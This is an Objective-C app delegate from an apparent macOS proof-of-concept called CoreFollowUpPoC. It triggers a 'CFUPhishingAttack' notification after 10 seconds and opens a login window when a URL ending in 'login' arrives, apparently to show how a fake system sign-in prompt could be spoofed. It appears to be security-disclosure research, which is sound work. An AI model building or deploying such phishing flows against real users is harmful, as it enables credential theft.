//
//  AppDelegate.m
//  CoreFollowUpPoC
//
//  Created by Gui Rambo on 23/12/20.
//

#import "AppDelegate.h"

#import "CoreFollowUpPoC-Swift.h"

#import "CFUPhishingAttack.h"

@interface AppDelegate ()

@property (strong) CFUPhishingAttack *attack;
@property (strong) LoginFlowWindowController *loginFlow;

@end

@implementation AppDelegate

- (void)applicationWillFinishLaunching:(NSNotification *)notification
{
    [NSAppleEventManager.sharedAppleEventManager setEventHandler:self andSelector:@selector(handleEvent:withReplyEvent:) forEventClass:kInternetEventClass andEventID:kAEGetURL];
}

- (void)applicationDidFinishLaunching:(NSNotification *)notification
{
    NSString *testURL = [[NSUserDefaults standardUserDefaults] stringForKey:@"CFUOpenURL"];
    
    if (testURL) {
        [self cfu_openURL:testURL];
    } else {
        NSLog(@"Triggering attack in 10s...");
        
        self.attack = [CFUPhishingAttack new];
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self.attack postNotification];
        });
    }
}

- (void)handleEvent:(NSAppleEventDescriptor *)event withReplyEvent:(NSAppleEventDescriptor *)reply
{
    NSString *url = [event paramDescriptorForKeyword:keyDirectObject].stringValue;
    NSLog(@"Handle URL: %@", url);
    
    [self cfu_openURL:url];
}

- (void)cfu_openURL:(NSString *)url
{
    if ([url hasSuffix:@"login"]) {
        [self showLoginFlow];
    }
}

- (void)showLoginFlow
{
    [NSApp activateIgnoringOtherApps:YES];
    
    dispatch_async(dispatch_get_main_queue(), ^{    
        self.loginFlow = [LoginFlowWindowController instantiate];
        [self.loginFlow showWindow:self];
        [self.loginFlow.window center];
    });
}

@end
